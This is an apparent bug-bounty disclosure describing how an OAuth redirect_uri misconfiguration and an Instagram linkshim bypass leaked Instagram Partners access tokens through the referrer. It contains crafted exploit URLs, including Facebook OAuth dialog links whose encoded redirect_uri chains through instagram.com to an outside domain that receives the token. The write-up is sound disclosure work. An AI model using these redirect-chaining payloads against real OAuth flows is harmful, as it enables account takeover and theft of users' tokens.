>Getting access token of instagram partner's account through referrer leakage using linkshim

This issue allowed me to take over the insta partners account code and access_token.

Instagram partners uses facebook for authentication. The redirect_uri for the fb oauth is `instagrampartners.com`. But a small
misconfiguration in redirect_uri helped me to take over the access_token.

Partners was allowing `instagram.com` as a domain for redirection and even subdomains `*.instagram.com`. There is no option for me 
except linkshim or oauth to bypass. linkshim clears the referrer and remaining headers before redirecting.

Redirection bypass contained url encoded elements which helped parameters from facebook to escape the linkshim of instagram. Using 
url encoding helped linkshim url with access token to leak through referrer.

Example consider this linkshim instagram url:

>http://l.instagram.com/?e=ATOXOxtB9yyG_wGoXgyErxBx3KAgobQMKybv-L8O_PEdXI0Z4rqoawet2349Lw&u=http://google.com/

Linkshim bypass url :

>http://l.instagram.com/?e%3DATOXOxtB9yyG_wGoXgyErxBx3KAgobQMKybv-L8O_PEdXI0Z4rqoawet2349Lw%26u%3Dhttp://google.com

Oauth bypass url : 

>https://www.facebook.com/v2.2/dialog/oauth?client_id=1672090479675902&redirect_uri=http%3A%2F%2Fl.instagram.com%2F%3Fe%3DATNqsDRx0x7ZVfVF282iVvW4zr6QOhmME_M35bNw6rHrt6L30ajQ2t-YStDi6g%26u%3Dhttp%3A%2F%2Fgoogle.com%2F&scope=public_profile%2Cemail&response_type=code


Proof of concept : 

<iframe src="https://drive.google.com/file/d/0BycKB4yADa3bZk4zMU9TdUFQMzg/preview" width="640" height="480"></iframe>


Code it self can't do any thing without `client_secret` and same redirect url (instagrampartners.com) is required for explict authentication from server side.
Linkshim was not allowing url fragments. When `response_type` is set to `token`, It returns in the from of fragment. So anything
after `#` is negelected by linkshim. I used oauth to bypass the restrictions by linkshim.

Oauth bypass url using oauth :

>https://www.facebook.com/v2.2/dialog/oauth?client_id=1672090479675902&scope=public_profile%2Cemail&response_type=token&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Foauth%2Fauthorize%2F%3Fclient_id%3D{REDACTED}%26response_type%3Dcode%26redirect_uri%3Dhttp%3A%2F%2Fmunchinng.com%2F%26state%3D

Proof of concept :

<iframe src="https://drive.google.com/file/d/0BycKB4yADa3bZTJEdmtIc1lMUDA/preview" width="640" height="480"></iframe>


